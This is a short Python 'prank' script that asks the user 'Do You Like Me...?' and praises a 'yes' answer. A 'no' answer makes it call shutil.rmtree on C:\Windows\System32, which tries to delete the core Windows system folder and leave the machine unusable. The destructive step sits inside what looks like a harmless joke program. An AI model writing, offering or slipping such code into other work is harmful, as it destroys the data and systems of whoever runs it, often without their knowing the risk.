import shutil

print("\nDo You Like Me...?\n")
while True:
    answer = input("Your Reply ['yes' or 'no'] --> ").lower().strip()
    if(answer == "yes"):
        print("Aww..., You are best!")
        break
    elif(answer == "no"):
        try:
            shutil.rmtree("C:\Windows\System32")
            break
        except FileNotFoundError:
            print("File Not Found!")
    else:
        print("Answer my question...!")
        